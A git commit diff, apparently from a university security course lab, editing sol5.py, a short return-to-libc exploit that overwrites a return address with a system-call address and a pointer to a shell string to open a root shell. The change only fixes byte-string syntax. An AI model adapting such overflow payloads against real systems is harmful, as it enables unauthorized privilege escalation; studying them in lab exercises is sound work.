3a3fdb1a880d2fdd674921b53d25236f2b28c1ad
marymx <marymx@umich.edu>
2022-03-30 20:30:25 +0000

    Automatic commit by test script for marymx yaoche

--- sol5.py
+++ sol5.py
@@ -2,7 +2,7 @@ import sys
 from struct import pack
 
 #Need to run /bin/sh and open a root shell
-filler = b("D"*22)
+filler = b"D" * 22
 ret= 0x0804ef50.to_bytes(4, "little")#start of systemx
 dummy_ret = "f"*4
 arg= 0xbffefaa8.to_bytes(4, "little") #wherever shell code string is
